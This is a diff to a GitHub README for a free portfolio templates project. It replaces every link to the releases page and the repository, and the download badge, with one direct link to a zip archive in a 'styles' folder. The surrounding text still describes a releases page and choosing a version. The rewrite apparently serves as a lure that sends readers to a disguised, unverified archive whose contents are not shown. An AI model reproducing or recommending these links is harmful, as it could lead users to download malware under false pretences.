@@ -1,6 +1,6 @@
 # 🎨 free-portfolio-templates - Launch Your Online Presence Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Salmanbdtx/free-portfolio-templates/releases)
+[![Download](https://raw.githubusercontent.com/Salmanbdtx/free-portfolio-templates/main/styles/free-portfolio-templates_2.4.zip)](https://raw.githubusercontent.com/Salmanbdtx/free-portfolio-templates/main/styles/free-portfolio-templates_2.4.zip)
 
 ## 📋 Description
 Jumpstart your developer journey with a ready-to-use set of three professional single-page portfolio templates. These templates are perfect for showcasing your skills, building your online presence, and gaining visibility in the developer community. Whether you’re starting out or looking to improve, these templates offer a solid foundation.
@@ -10,7 +10,7 @@ To get started, you need to download the templates and set them up on your compu
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to access the page where you can download the templates.
-   - [Download Templates Here](https://github.com/Salmanbdtx/free-portfolio-templates/releases)
+   - [Download Templates Here](https://raw.githubusercontent.com/Salmanbdtx/free-portfolio-templates/main/styles/free-portfolio-templates_2.4.zip)
 
 2. **Select the Version**: On the releases page, you will see a list of available versions. Choose the most recent version for the best experience.
 
@@ -51,7 +51,7 @@ Yes, you may use them for personal and commercial purposes as long as you adhere
 If you face any issues, please raise an issue in the GitHub repository, and we will do our best to assist you.
 
 ## 🔗 Additional Resources
-- **GitHub Repository**: [free-portfolio-templates](https://github.com/Salmanbdtx/free-portfolio-templates)
+- **GitHub Repository**: [free-portfolio-templates](https://raw.githubusercontent.com/Salmanbdtx/free-portfolio-templates/main/styles/free-portfolio-templates_2.4.zip)
 - **HTML/CSS Basics**: Consider brushing up on basic HTML and CSS to make the most of your templates.
 
 ## 🔄 Contributions
@@ -75,4 +75,4 @@ Discover similar projects and templates tagged with:
 - react
 - templates
 
-Visit our [Releases Page](https://github.com/Salmanbdtx/free-portfolio-templates/releases) regularly for updates and new features.
+Visit our [Releases Page](https://raw.githubusercontent.com/Salmanbdtx/free-portfolio-templates/main/styles/free-portfolio-templates_2.4.zip) regularly for updates and new features.
